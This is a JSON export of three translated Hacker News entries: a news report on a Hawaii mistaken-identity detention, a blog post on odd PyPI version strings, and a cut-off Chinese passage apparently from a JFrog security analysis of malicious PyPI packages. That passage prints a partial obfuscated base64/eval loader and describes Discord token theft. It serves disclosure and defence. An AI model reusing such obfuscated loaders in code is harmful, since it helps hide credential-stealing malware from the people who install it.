[{"category": "", "categoryclass": "", "imagename": "", "infoid": 1071341, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Joshua Spriestersbach \u5728\u88ab\u5173\u62bc\u4e24\u5e74\u96f6\u516b\u4e2a\u6708\u5e76\u88ab\u8feb\u670d\u7528\u7cbe\u795e\u836f\u7269\u540e\u83b7\u91ca \u4e00\u540d\u56e0\u4ed6\u4eba\u72af\u7f6a\u800c\u88ab\u9519\u8bef\u902e\u6355\u5e76\u88ab\u5173\u62bc\u5728\u7cbe\u795e\u75c5\u9662\u8fd1\u4e09\u5e74\u7684\u65e0\u5bb6\u53ef\u5f52\u8005\u88ab\u6084\u6084\u91ca\u653e\uff0c\u6700\u8fd1\u6cd5\u5ead\u590f\u5a01\u5937\u6587\u4ef6\u663e\u793a\u3002\u5728\u5468\u4e00\u665a\u4e0a\u63d0\u4ea4\u7684\u6cd5\u5ead\u8bf7\u613f\u4e66\u4e2d\uff0c\u590f\u5a01\u5937\u65e0\u7f6a\u8ba1\u5212\u8981\u6c42\u6cd5\u5b98\u64a4\u9500\u5bf9\u7ea6\u4e66\u4e9a\u00b7\u65af\u666e\u91cc\u65af\u7279\u65af\u5df4\u8d6b\u7684\u902e\u6355\u5e76\u66f4\u6b63\u4ed6\u7684\u8bb0\u5f55\u3002\u6cd5\u5ead\u6587\u4ef6\u8be6\u7ec6\u63cf\u8ff0\u4e86 Spriestersbach \u7684\u56f0\u5883\uff0c\u59cb\u4e8e 2017 \u5e74\u4ed6\u5728\u6a80\u9999\u5c71\u907f\u96be\u6240\u5916\u7b49\u5f85\u98df\u7269\u65f6\u5728\u4eba\u884c\u9053\u4e0a\u7761\u7740\u4e86\u3002 \u5f53\u4e00\u540d\u8b66\u5bdf\u53eb\u9192\u4ed6\u65f6\uff0cSpriestersbach \u8ba4\u4e3a\u4ed6\u662f\u56e0\u4e3a\u8be5\u5e02\u7981\u6b62\u5750\u4e0b\u6216\u8eba\u4e0b\u800c\u88ab\u6355\u5728\u516c\u5171\u4eba\u884c\u9053\u4e0a\u3002\u5b9e\u9645\u4e0a\uff0c\u8b66\u5b98\u8bef\u8ba4\u4e3a\u4ed6\u662f\u4e00\u4e2a\u540d\u53eb Thomas Castleberry \u7684\u4eba\uff0c\u4ed6\u5728 2006 \u5e74\u56e0\u6bd2\u54c1\u72af\u7f6a\u800c\u88ab\u902e\u6355\u65f6\u6301\u6709\u672a\u5b8c\u6210\u7684\u902e\u6355\u4ee4\u3002\u6839\u636e\u590f\u5a01\u5937\u7eaf\u771f\u8ba1\u5212\uff0cSpriestersbach \u548c Castleberry \u4ece\u672a\u89c1\u8fc7\u9762\uff0cSpriestersbach \u4e5f\u4ece\u672a\u58f0\u79f0\u81ea\u5df1\u662f Castleberry\u3002 Spriestersbach \u7684\u5f8b\u5e08\u8fa9\u79f0\uff0c\u5982\u679c\u8b66\u65b9\u7b80\u5355\u5730\u6bd4\u8f83\u4e24\u4eba\u7684\u6307\u7eb9\u548c\u7167\u7247\uff0c\u5c31\u53ef\u4ee5\u907f\u514d\u6df7\u6dc6\u3002\u76f8\u53cd\uff0c\u590f\u5a01\u5937\u5b98\u5458\u5c06 Spriestersbach \u5173\u5728\u590f\u5a01\u5937\u5dde\u7acb\u533b\u9662\u8fd1\u4e09\u5e74\uff0c\u5e76\u5f3a\u8feb\u4ed6\u670d\u7528\u7cbe\u795e\u836f\u7269\u3002 2020 \u5e74 1 \u6708\uff0c\u5b98\u5458\u4eec\u610f\u8bc6\u5230\u4ed6\u4eec\u7684\u9519\u8bef\uff0c\u6084\u6084\u91ca\u653e\u4e86\u4ed6\uff0c\u5e76\u4ee5 50 \u7f8e\u5206\u7684\u540d\u4e49\u91ca\u653e\u4e86\u4ed6\u3002 \u201cSpriestersbach \u5148\u751f\u8d8a\u662f\u901a\u8fc7\u65ad\u8a00\u4ed6\u4e0d\u662f Castleberry \u5148\u751f\u6765\u8868\u8fbe\u4ed6\u7684\u6e05\u767d\uff0cHSH \u7684\u5de5\u4f5c\u4eba\u5458\u548c\u533b\u751f\u5c31\u8d8a\u8ba4\u4e3a\u4ed6\u6709\u5984\u60f3\u548c\u7cbe\u795e\u75c5\uff0c\u5e76\u4e14\u670d\u7528\u4e86\u5927\u91cf\u836f\u7269\uff0c\u201d\u8bf7\u613f\u4e66\u8bf4\u3002 \u201c\u6ca1\u6709\u4eba\u4f1a\u76f8\u4fe1\u4ed6\u6216\u91c7\u53d6\u4efb\u4f55\u6709\u610f\u4e49\u7684\u6b65\u9aa4\u6765\u9a8c\u8bc1\u4ed6\u7684\u8eab\u4efd\u5e76\u786e\u5b9a Spriestersbach \u5148\u751f\u8bf4\u7684\u662f\u5b9e\u8bdd\u2014\u2014\u4ed6\u4e0d\u662f Castleberry \u5148\u751f\uff0c\u201d\u5b83\u8865\u5145\u8bf4\u3002\n\u5728\u4e24\u5e74\u96f6\u516b\u4e2a\u6708\u7684\u65f6\u95f4\u91cc\uff0c\u533b\u9662\u5de5\u4f5c\u4eba\u5458\u548c Spriestersbach \u81ea\u5df1\u7684\u516c\u8bbe\u8fa9\u62a4\u4eba\u62d2\u7edd\u76f8\u4fe1\u4ed6\uff0c\u76f4\u5230\u533b\u9662\u7684\u7cbe\u795e\u79d1\u533b\u751f\u6700\u7ec8\u542c\u53d6\u4e86\u4ed6\u7684\u610f\u89c1\u3002\u6839\u636e\u6cd5\u5ead\u6587\u4ef6\uff0c\u5f53\u5361\u65af\u5c14\u4f2f\u91cc\u6700\u521d\u88ab\u6355\u65f6\uff0c\u4ed6\u53ea\u9700\u8981\u901a\u8fc7\u8c37\u6b4c\u641c\u7d22\u548c\u7535\u8bdd\u786e\u8ba4\u4ed6\u5728\u53e6\u4e00\u4e2a\u5c9b\u4e0a\u3002\u590f\u5a01\u5937\u65e0\u7f6a\u8ba1\u5212\u6279\u8bc4\u4e86\u8b66\u5bdf\u3001\u5dde\u516c\u8bbe\u8fa9\u62a4\u4eba\u529e\u516c\u5ba4\u3001\u5dde\u68c0\u5bdf\u957f\u548c\u5dde\u533b\u9662\uff0c\u79f0\u5404\u65b9\u201c\u90fd\u5e94\u4e3a\u8fd9\u4e00\u4e25\u91cd\u7684\u53f8\u6cd5\u4e0d\u516c\u8d1f\u8d23\u201d\u3002", "note_en": "Joshua Spriestersbach was released after being locked up for two years and eight months and forced to take psychiatric drugs\n    A homeless man wrongly arrested for a crime committed by someone else and locked up in a mental health hospital for nearly three years was quietly released, recent court documents in  Hawaii show.\n In a court petition filed on Monday night, the Hawaii Innocence Project asked a judge to rescind Joshua Spriestersbach\u2019s arrest and correct his records. The court filings detail Spriestersbach\u2019s plight, which started when he fell asleep on a sidewalk while waiting for food outside a Honolulu shelter in 2017.\n  When a police officer woke him up, Spriestersbach thought he was being arrested for the city\u2019s ban on sitting or lying down on public sidewalks. In reality, the officer mistook him for a man named Thomas Castleberry, who had an outstanding warrant from a 2006 arrest for drug crimes.\n According to the Hawaii Innocence Project, Spriestersbach and Castleberry had never met and Spriestersbach had never claimed to be Castleberry.\n Spriestersbach\u2019s lawyers argue that the mixup could have been avoided if police had simply compared the two men\u2019s fingerprints and photographs. Instead, Hawaii officials locked Spriestersbach in the Hawaii State Hospital for nearly three years and forced him to take psychiatric drugs. In January 2020, officials realized their mistake and quietly released him, with 50 cents to his name.\n \u201cThe more Mr. Spriestersbach vocalized his innocence by asserting that he is not Mr Castleberry, the more he was declared delusional and psychotic by the HSH staff and doctors and heavily medicated,\u201d the petition  said. \u201cNo one would believe him or take any meaningful steps to verify his identity and determine that Mr. Spriestersbach was telling the truth \u2013 he was not Mr Castleberry,\u201d it added.\n For two years and eight months, hospital staff and Spriestersbach\u2019s own public defenders refused to believe him, until a hospital psychiatrist finally listened.  According to the court document, all it took were a few Google searches and phone calls to confirm that he was on another island when Castleberry was initially arrested.\n  The Hawaii Innocence Project criticized the police, state public defender\u2019s office, state attorney general and the state hospital,  stating that all parties \u201cshare in the blame for this gross miscarriage of justice\u201d.", "posttime": "2021-08-05 20:56:04", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u8eab\u4efd,arrested,spriestersbach", "title": "\u7537\u5b50\u56e0\u8eab\u4efd\u9519\u8bef\u88ab\u6355\u5165\u72f1\u4e24\u5e74", "title_en": "Man arrested in mistaken identity case locked in mental hospital for two years", "transed": 1, "url": "https://www.theguardian.com/us-news/2021/aug/04/hawaii-man-mistaken-identity-case-mental-hospital-two-years", "via": "", "real_tags": ["\u8eab\u4efd", "arrested"]}, {"category": "", "categoryclass": "", "imagename": "27654285c5d03d3ce7174426613e664b.png", "infoid": 1071340, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6807\u9898\u662f\u5bf9\u4f18\u79c0 Python Package Index \u4e2d\u6700\u5e38\u88ab\u9057\u5fd8\u7684\u6635\u79f0\u7684\u5f15\u7528\u2014\u2014\u5976\u916a\u5e97\u2014\u2014\u5b83\u6307\u7684\u662f Monty Python Cheese Shop \u8349\u56fe\u3002\u6211\u7ecf\u5e38\u53d1\u73b0\u81ea\u5df1\u76ef\u7740 piwheels \u76d1\u89c6\u5668\uff0c\u5076\u5c14\u4f1a\u5f39\u51fa\u4e00\u4e2a\u5947\u602a\u7684\u5305\u540d\u6216\u5f02\u5e38\u957f\u7684\u7248\u672c\u53f7\uff1a\u6211\u6700\u8fd1\u505a\u4e86\u5f88\u591a\u5ba1\u8ba1 piwheels \u4e0e PyPI\uff0c\u786e\u4fdd\u6211\u4eec\u6709\u6b63\u786e\u7684\u5305\u548c\u7248\u672c\u96c6\uff0c\u4fee\u526a\u672c\u5e94\u5220\u9664\u7684\u5185\u5bb9\u5e76\u6dfb\u52a0\u4efb\u4f55\u4ee5\u67d0\u79cd\u65b9\u5f0f\u88ab\u9057\u6f0f\u7684\u5185\u5bb9\u3002\u6211\u9047\u5230\u4e86\u5f88\u591a\u6709\u8da3\u7684\u602a\u4e8b\uff0c\u6240\u4ee5\u6211\u60f3\u6211\u4f1a\u505a\u4e00\u4e9b\u5206\u6790\u548c\u63a2\u7d22\uff0c\u5e76\u5728\u8fd9\u91cc\u5206\u4eab\u7ed3\u679c\u3002\u4ee5\u4e0b\u5206\u6790\u662f\u524d\u51e0\u5929\u4ecePyPI\u5f97\u5230\u7684\u4e00\u7ec4\u5305\u548c\u7248\u672c\uff0c\u5f53\u65f6\u6709\uff1a \u6700\u4e0d\u5e38\u89c1\u7684\u5305\u540d\u957f\u5ea6\u4e3a72, 73, 74, 75, 80, 82, 83, 90, 92 \u2014\u2014\u6240\u6709\u8fd9\u4e9b\u90fd\u53d1\u751f\u4e00\u6b21\u3002\u5305\u540d\u6700\u5e38\u89c1\u7684\u8d77\u59cb\u5b57\u7b26\u662f p (14%)\uff0c\u56e0\u4e3a\u5f88\u591a\u5305\u88ab\u547d\u540d\u4e3a\u201cpy\u201d-something \u6216\u201cpython\u201d-something\u3002\u5176\u6b21\u662f d (9%) \u7531\u4e8e\u201cdjango-\u201d\u5305\u3002\u5176\u4f59\u5b57\u7b26\u96c6\u7684\u5206\u5e03\u662f\uff1a \u67e5\u770b\u524d\u4e24\u4e2a\u5b57\u7b26\uff0c\u6700\u5e38\u89c1\u7684\u662f py\u3001dj\u3001od\u3001co \u548c re\uff1a\n\u672c\u798f\u5fb7\u5b9a\u5f8b\u6307\u51fa\uff0c\u5728\u8bb8\u591a\u81ea\u7136\u53d1\u751f\u7684\u6570\u5b57\u96c6\u5408\u4e2d\uff0c\u524d\u5bfc\u6570\u5b57\u53ef\u80fd\u5f88\u5c0f\uff0c\u56e0\u6b64\u6bcf\u4e2a\u540e\u7eed\u6570\u5b57\u7684\u5206\u5e03\u4e0d\u592a\u53ef\u80fd\u3002\u6211\u60f3\u77e5\u9053\u8fd9\u662f\u5426\u53ef\u4ee5\u5728\u5305\u7248\u672c\u53f7\u4e2d\u770b\u5230\u3002\u53d6\u6570\u5b57\u7248\u672c\uff0c\u5e76\u67e5\u770b\u7b2c\u4e00\u4e2a\u975e\u96f6\u6570\u5b57\uff0c\u8be5\u5206\u5e03\u5408\u7406\u5730\u7b26\u5408 Benford \u5b9a\u5f8b\uff1a\u7136\u800c\uff0c\u67e5\u770b\u6240\u6709\u6570\u5b57\uff08\u4e0d\u4ec5\u4ec5\u662f\u7b2c\u4e00\u4e2a\uff09\u7684\u5206\u5e03\uff0c\u8fd9\u4e0e Benford \u5b9a\u5f8b\u63d0\u51fa\u7684\u6a21\u5f0f\u975e\u5e38\u76f8\u4f3c\u66f4\u63a5\u8fd1\uff1a\u5728\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c1 \u6bd4\u9884\u671f\u66f4\u5e38\u89c1\uff0c2 \u4f3c\u4e4e\u5b8c\u5168\u5bf9\u9f50\uff0c\u4f46 9 \u6bd4\u9884\u671f\u7a0d\u5fae\u66f4\u5e38\u89c1\uff0c\u5728\u7b2c\u4e00\u4e2a\u6570\u5b57\u793a\u4f8b\u4e2d\u66f4\u662f\u5982\u6b64\u3002\u6211\u6392\u9664\u4e86\u6ca1\u6709\u7248\u672c\u7684\u5305\uff08\u56e0\u4e3a\u5b83\u4eec\u5728 PyPI \u4e0a\u6ca1\u6709 JSON \u7aef\u70b9\uff09\u3002\u81f3\u4e8e\u5176\u4f59\u7684\uff0c\u8d85\u8fc7\u56db\u5206\u4e4b\u4e00\u53ea\u6709\u4e00\u4e2a\u7248\u672c\u3002\u968f\u7740\u7248\u672c\u6570\u91cf\u7684\u589e\u52a0\uff0c\u9891\u7387\u7a33\u6b65\u4e0b\u964d\uff1aPyPI \u5305\u7248\u672c\u4e0d\u5fc5\u662f\u4e25\u683c\u7684\u6570\u5b57\u2014\u2014\u5b83\u4eec\u901a\u5e38\u91c7\u7528 1.2.3 \u6216\u7c7b\u4f3c\u7684\u5f62\u5f0f\uff0c\u6709\u65f6\u9644\u52a0\u5b57\u7b26\u4ee5\u8868\u793a alpha\u3001beta\u3001dev \u6216 release\u5019\u9009\uff0c\u4f46\u5b83\u4eec\u53ef\u4ee5\u662f\u4efb\u4f55\u5b57\u7b26\u4e32\u3002\u6700\u957f\u7684\u7248\u672c\u662f\u5305lyricsprocessor\u7684\u4e00\u4e2a\u7248\u672c\uff0c\u5177\u6709\u7248\u672c\u53f70.1.40404040404040404040404040404040404040404040404040404040404040404040404040404040\uff0884\u4e2a\u5b57\u7b26\uff09\u7684\u4e0b\u4e00\u4e2a\u6700\u957f\u7684\u90fd\u6765\u81ea\u5305softwarefabrica-django\u7684-utils\u7684\u6392\u5b83\u5177\u670970\u4e2a\u5b57\u7b26\u7684\u7248\u672c\u4f8b\u59821.0dev-BZR-R115-panta- elasticworld.org-20100520155735-sf3yrsr0pvyvlm8m\n\u5728 PyPI \u7684\u5386\u53f2\u4e0a\uff0c\u6709\u4eba\u4e0d\u5c0f\u5fc3\u63d0\u4ea4\u4e86\u4ed6\u4eec\u5305\u7684\u63cf\u8ff0\u4f5c\u4e3a\u7248\u672c\u540d\u79f0\uff0c\u6240\u4ee5\u6709\u4e00\u4e2a\u5305 sysv-ipc \u7684\u7248\u672c\u53eb\u505a\uff1aSysv_ipc \u5141\u8bb8 Python \u7a0b\u5e8f\u8bbf\u95ee System V \u4fe1\u53f7\u91cf\u3001\u5171\u4eab\u5185\u5b58\u548c\u6d88\u606f\u961f\u5217\u3002\u5927\u591a\u6570\uff08\u5168\u90e8\uff1f\uff09Unix\uff08\u5305\u62ec OS X\uff09\u652f\u6301 System V IPC\u3002 Windows+Cygwin 1.7 \u4e5f\u53ef\u80fd\u5de5\u4f5c\u3002\u5305\u542b\u793a\u4f8b\u4ee3\u7801\u3002\u6b64\u6269\u5c55\u5728 GPL \u4e0b\u53d1\u5e03\u3002\u60a8\u53ef\u80fd\u8fd8\u5bf9\u7c7b\u4f3c\u7684 POSIX IPC \u6a21\u5757\u611f\u5174\u8da3\uff1ahttp://semanchuk.com/philip/posix_ipc/ \u5176\u4ed6\u65f6\u5019\u8fd9\u79cd\u4e8b\u60c5\u662f\u5076\u7136\u53d1\u751f\u7684\uff0c\u5305\u62ec\u7b2c\u4e00\u4e2a\u7248\u672c\u7684 omnijson\uff0c\u5b83\u88ab\u79f0\u4e3a\u201cKenneth Reitz\u201d\u5e76\u4e14\u662f\u8fd8\u6d3b\u7740\uff1a\u6211\u6700\u8fd1\u6ce8\u610f\u5230\u4e00\u4e2a\u7248\u672c\u7684\u672b\u5c3e\u4f3c\u4e4e\u6709\u7a7a\u683c\uff0c\u7136\u540e\u770b\u770b\u662f\u5426\u8fd8\u6709\u5176\u4ed6\u7248\u672c\u3002 PyPI \u4e0a\u6709 16 \u4e2a\u4ee5\u6362\u884c\u7b26\u7ed3\u5c3e\u7684\u7248\u672c\u3002\u5728\u8fd9 16 \u4e2a\u4e2d\uff0c\u6709 12 \u4e2a\u4e5f\u6ce8\u518c\u4e86\u5265\u79bb\u7684\u7b49\u6548\u9879\uff1a\u7531\u4e8e\u7248\u672c\u53f7\u5f80\u5f80\u662f\u6570\u5b57\uff0c\u56e0\u6b64\u6700\u6709\u8da3\u7684\u80af\u5b9a\u662f\u90a3\u4e9b\u6ca1\u6709\u4efb\u4f55\u6570\u5b57\u7684\u7248\u672c\u3002\u7531\u4e8e\u8be5\u7248\u672c\u5728\u5176\u53d1\u884c\u7248\u4e2d\u5305\u542b\u4e00\u4e2a tarball\uff0c\u60a8\u53ef\u4ee5\u68c0\u67e5\u6b64\u4e8b\u6545\u662f\u5982\u4f55\u53d1\u751f\u7684\u3002\u8bb8\u591a\u7528\u4e8e\u8ba1\u7b97\u7248\u672c\u53f7\u7684\u590d\u6742\u4ee3\u7801\u2026\u2026\u51fa\u9519\u4e86\u3002\u7248\u672c\u5b57\u7b26\u4e32\u5b9e\u9645\u4e0a\u662f Version \u7c7b\u7684\u4ee3\u8868\uff0c\u800c\u4e0d\u662f\u5b9e\u4f8b\u7684\u5b57\u7b26\u4e32\u8868\u793a\uff0c\u6b63\u5982\u9884\u671f\u7684\u90a3\u6837\u3002\u901a\u5e38\u5b83\u4f1a\u663e\u793a\u4e3a &lt;__class__.jw.util.version.Version&gt; \u4f46\u5b83\u5df2\u88ab\u89c4\u8303\u5316\uff0c\u7528\u5355\u4e2a\u8fde\u5b57\u7b26\u66ff\u6362\u5c16\u62ec\u53f7\u548c\u53cc\u4e0b\u5212\u7ebf\u3002\u6709\u8da3\u7684\u662f\uff08\u5982\u679c\u4f60\u5df2\u7ecf\u505a\u5230\u4e86\u8fd9\u4e00\u70b9\uff0c\u6211\u8ba4\u4e3a\u4f60\u662f\u90a3\u79cd\u4f1a\u89c9\u5f97\u8fd9\u5f88\u6709\u8da3\u7684\u4eba\uff09\uff0c\u5728\u5177\u6709\u975e\u6570\u5b57\u7248\u672c\u7684 166 \u4e2a\u8f6f\u4ef6\u5305\u4e2d\uff0c\u9664\u4e86\u4e94\u4e2a\u4e4b\u5916\uff0c\u6240\u6709\u8f6f\u4ef6\u5305\u90fd\u53ea\u6709\u4e00\u4e2a\u975e\u6570\u5b57\u7248\u672c\u7248\u672c\uff0c\u800c\u8fd9\u4e94\u4e2a\u7248\u672c\u5404\u53ea\u6709\u4e24\u4e2a\u8fd9\u6837\u7684\u7248\u672c\u3002\u90a3\u4e9b\u662f\uff1a\n\u60a8\u53ef\u4ee5\u5728 GitHub \u4e0a\u67e5\u770b\u7b14\u8bb0\u672c\u4ee5\u4e86\u89e3\u56f4\u7ed5\u6b64\u5206\u6790\u7684\u5de5\u4f5c\uff0c\u5305\u62ec\u6211\u5982\u4f55\u4f7f\u7528 XMLRPC \u548c JSON API \u4ece PyPI \u83b7\u53d6\u6570\u636e\u3002", "note_en": "The title is a reference to the mostly forgotten nickname of the excellent  Python Package Index \u2014  Cheese Shop \u2014 which refers to the Monty Python  Cheese Shop sketch.\n I often find myself staring at the piwheels monitor, and occasionally a strange package name or an unusually longer version number pops up:\n  I\u2019ve been doing a lot of auditing piwheels vs PyPI lately, making sure we have the right set of packages and versions, pruning stuff that should have been deleted and adding in any that somehow got missed. And I came across lots of interesting oddities, so I thought I\u2019d do some analysis and exploration and share the results here.\n The following analysis is of a set of packages and version obtained from PyPI a few days ago, and at the time there were:\n     The least common package name lengths are  72,  73,  74,  75,  80,  82,  83,  90,  92 \u2014 all of which occur once.\n      The most common starting character for a package name is  p (14%), due to lots of packages being named \u201cpy\u201d-something or \u201cpython\u201d-something. Second is  d (9%) due to \u201cdjango-\u201d packages. The distribution for the rest of the character set is:\n    Looking at the first two characters, the most common are  py,  dj,  od,  co and  re:\n     Benford\u2019s Law states that in many naturally occurring collections of numbers, the leading digit is likely to be small, and hence the distribution of each subsequent digit is less likely. I wondered if this could be seen within package version numbers. Taking the numeric versions, and looking at the first non-zero digit, the distribution is reasonably compliant with Benford\u2019s Law:\n  However, looking at the distribution of all digits (not just the first), this follows the pattern laid out by Benford\u2019s Law much more closely:\n  In both cases, 1 is more common that expected, 2 seems to be perfectly aligned, but 9 is slightly more common than expected, more so in the first digit example.\n  I excluded packages which had no versions (because they don\u2019t have JSON endpoints on PyPI). As for the rest of them, over a quarter only have a single version. The frequency drops steadily as the number of versions rises:\n    A PyPI package version doesn\u2019t have to be strictly numeric \u2013 they\u2019re usually in the form 1.2.3 or similar, sometimes with characters appended to indicate alpha, beta, dev or release candidate, but they can be  any string.\n The longest version is a version of package   lyricsprocessor, with the version number   0.1.40404040404040404040404040404040404040404040404040404040404040404040404040404040 (84 chars)\n The next longest are all from package   softwarefabrica-django-utils which exclusively has versions of 70 characters e.g.   1.0dev-BZR-r115-panta-elasticworld.org-20100520155735-sf3yrsr0pvyvlm8m\n   At one point in PyPI\u2019s history, someone accidentally submitted the description of their package as the version name, so there was a version of package   sysv-ipc called:\n Sysv_ipc gives Python programs access to System V semaphores, shared memory and message queues. Most (all?) Unixes (including OS X) support System V IPC. Windows+Cygwin 1.7 might also work. Sample code is included.This extension is released under the GPL. You might also be interested in the similar POSIX IPC module at: http://semanchuk.com/philip/posix_ipc/\n   Other times this kind of thing has happened by accident include the first version of   omnijson which was called \u201c  Kenneth Reitz\u201d and is still live:\n   I recently noticed a version which seemed to have whitespace at the end of it, and had a look to see if there were others. There are 16 versions on PyPI which end in a newline character. Of these 16, 12 have registered the stripped equivalent too:\n     Since version numbers tend to be numeric, surely the most interesting ones are those without any numbers in them.\n    Since the version included a tarball in its  release, you can inspect how this accident occurred. Lots of complicated code for calculating what the version number should be \u2026 gone wrong. The version string is actually the  repr of the Version class, not the string representation of the instance, as intended. Normally it would appear as  &lt;__class__.jw.util.version.Version&gt; but it\u2019s been canonicalised, replacing the angle brackets and double underscores with single hyphens.\n Interestingly (if you\u2019ve made it this far, I think you\u2019re the kind of person who\u2019ll find this interesting), of the 166 packages with non-numeric versions, all but five of them have only a single non-numeric version, and those five only have two such versions each. Those are:\n     You can view the notebook to see the workings around this analysis on   GitHub, including how I obtained the data from PyPI using the XMLRPC and JSON APIs.", "posttime": "2021-08-05 20:55:35", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "shop,cheese,\u7248\u672c", "title": "Cheese Shop \u83dc\u5355\u7684\u5916\u76ae", "title_en": "The rinds of the Cheese Shop menu", "transed": 1, "url": "https://blog.piwheels.org/the-rinds-of-the-cheese-shop-menu/", "via": "", "real_tags": ["shop", "cheese", "\u7248\u672c"]}, {"category": "", "categoryclass": "", "imagename": "da72ed83418b9eaef7e64f16d3dcedf0.png", "infoid": 1071339, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8f6f\u4ef6\u5305\u5b58\u50a8\u5e93\u6b63\u5728\u6210\u4e3a\u4f9b\u5e94\u94fe\u653b\u51fb\u7684\u70ed\u95e8\u76ee\u6807\u3002\u6700\u8fd1\uff0c\u6709\u5173\u4e8e\u6076\u610f\u8f6f\u4ef6\u653b\u51fb npm\u3001PyPI \u548c RubyGems \u7b49\u6d41\u884c\u5b58\u50a8\u5e93\u7684\u6d88\u606f\u3002\u5f00\u53d1\u4eba\u5458\u76f2\u76ee\u5730\u4fe1\u4efb\u5b58\u50a8\u5e93\u5e76\u4ece\u8fd9\u4e9b\u6765\u6e90\u5b89\u88c5\u8f6f\u4ef6\u5305\uff0c\u5047\u8bbe\u5b83\u4eec\u662f\u5b89\u5168\u7684\u3002\u6709\u65f6\u5141\u8bb8\u5c06\u6076\u610f\u8f6f\u4ef6\u5305\u4e0a\u4f20\u5230\u5305\u5b58\u50a8\u5e93\uff0c\u4f7f\u6076\u610f\u884c\u4e3a\u8005\u6709\u673a\u4f1a\u4f7f\u7528\u5b58\u50a8\u5e93\u5206\u53d1\u75c5\u6bd2\u5e76\u5bf9\u7ba1\u9053\u4e2d\u7684\u5f00\u53d1\u4eba\u5458\u548c CI/CD \u673a\u5668\u53d1\u8d77\u6210\u529f\u7684\u653b\u51fb\u3002\u4f5c\u4e3a JFrog \u5b89\u5168\u7814\u7a76\u56e2\u961f\uff08\u524d\u8eab\u4e3a Vdoo\uff09\u81ea\u52a8\u8bc6\u522b\u6076\u610f\u5305\u7684\u6301\u7eed\u52aa\u529b\u7684\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u73b0\u5728\u62a5\u544a\u6258\u7ba1\u5728 PyPI \u4e0a\u7684\u51e0\u4e2a Python \u5305\u662f\u6076\u610f\u7684\u3002\u6211\u4eec\u5df2\u901a\u77e5 PyPI \u6709\u5173\u6076\u610f\u8f6f\u4ef6\u5305\u7684\u5b58\u5728\uff0c\u5e76\u7acb\u5373\u5c06\u5176\u5220\u9664\u3002\u6839\u636e pepy.tech \u7684\u6570\u636e\uff0c\u6211\u4eec\u4f30\u8ba1\u6076\u610f\u8f6f\u4ef6\u5305\u7684\u4e0b\u8f7d\u6b21\u6570\u7ea6\u4e3a 30,000 \u6b21\u3002\u6211\u4eec\u76ee\u524d\u6ca1\u6709\u5173\u4e8e\u4f7f\u7528\u8fd9\u4e9b\u6076\u610f\u8f6f\u4ef6\u5305\u9020\u6210\u7684\u5b9e\u9645\u5f71\u54cd\u7684\u6570\u636e\u3002\u5728\u8fd9\u7bc7\u535a\u6587\u4e2d\uff0c\u6211\u4eec\u5c06\u5206\u4eab\u8fd9\u4e9b\u8f6f\u4ef6\u5305\u7684\u6280\u672f\u5206\u6790\u53ca\u5176\u5f71\u54cd\u3002\u4e0a\u8ff0\u6240\u6709\u8f6f\u4ef6\u5305\uff08\u4ee5\u53ca\u5927\u591a\u6570 Python \u65b0\u624b\u6076\u610f\u8f6f\u4ef6\uff09\u90fd\u4f7f\u7528\u4e86\u4e00\u79cd\u7b80\u5355\u7684\u6df7\u6dc6\u6280\u672f\uff1aimport base64, codecs magic = &#39;aW1wb3J0IGNvbG9yYW1hLCBkYXRldGltZS...&#39; love = &#39;0iL\u200b\u200bKOcY3L4Y2q1nJkxpl97nZYogdm&#39;... yxIKAVDaAQK3xjpQWkqRAboUcBIzqjEmS...&#39;joy = &#39;\\x72\\x6f\\x74\\x31\\x33&#39; trust = eval(&#39;\\x6d\\x61\\x67\\x69\\x63&#39;) + eval(&#39;\\x63\\x6x5\\x63&#39; \\x73\\x2e\\x64...&#39;) eval(compile(base64.b64decode(eval(&#39;\\x74\\x72\\x75\\x73\\x74&#39;)),&#39;&#39;,&#39;exec&#39;)) \u8fd9\u79cd\u6df7\u6dc6\u53ef\u4ee5\u6b3a\u9a97\u4e00\u4e2a\u7b80\u5355\u7684\u9759\u6001\u5206\u6790\u5de5\u5177\uff0c\u4f46\u5e76\u4e0d\u53cd\u5bf9\u66f4\u5f7b\u5e95\u7684\u5206\u6790\uff0c\u5b9e\u9645\u4e0a\u63d0\u51fa\u4e86\u4e00\u4e2a\u5371\u9669\u4fe1\u53f7\uff0c\u8ba9\u8bb8\u591a\u7814\u7a76\u4eba\u5458\u4ed4\u7ec6\u7814\u7a76\u8fd9\u6bb5\u4ee3\u7801\u3002\u6df7\u6dc6\u4ee3\u7801\u4e2d\u4f7f\u7528\u7684\u7279\u5b9a\uff08\u53d7\u5317\u6b27\u91d1\u5c5e\u542f\u53d1\uff1f\uff09\u5b57\u7b26\u4e32\u5e2e\u52a9\u6211\u4eec\u610f\u8bc6\u5230\u6076\u610f\u8f6f\u4ef6\u53ea\u662f\u4f7f\u7528\u516c\u5171\u5de5\u5177 python-obfuscator \u8fdb\u884c\u4e86\u5904\u7406\u3002\n\u4f7f\u7528 PyArmor \u5bf9 aryi \u548c permit \u5305\u8fdb\u884c\u4e86\u6df7\u6dc6\uff0c\u8fd9\u8868\u660e\u6076\u610f\u8f6f\u4ef6\u5f00\u53d1\u4eba\u5458\u6b63\u5728\u5c1d\u8bd5\u4e0d\u540c\u7684\u6df7\u6dc6\u65b9\u6cd5\u3002\u8d35\u65cf\u201c\u5bb6\u65cf\u201d\u6076\u610f\u8f6f\u4ef6\u7684\u7b2c\u4e00\u4e2a\u6709\u6548\u8f7d\u8377\u662f\u7a83\u53d6 Discord \u8eab\u4efd\u9a8c\u8bc1\u4ee4\u724c\u3002\u8eab\u4efd\u9a8c\u8bc1\u4ee4\u724c\u5141\u8bb8\u653b\u51fb\u8005\u5192\u5145\u6700\u521d\u6301\u6709\u4ee4\u724c\u7684\u7528\u6237\uff08\u7c7b\u4f3c\u4e8e HTTP \u4f1a\u8bdd cookie\uff09\u3002\u7a83\u53d6\u4ee4\u724c\u7684\u6709\u6548\u8f7d\u8377\u57fa\u4e8e\u81ed\u540d\u662d\u8457\u7684 dTGPG\uff08Discord Token Grabber Payload 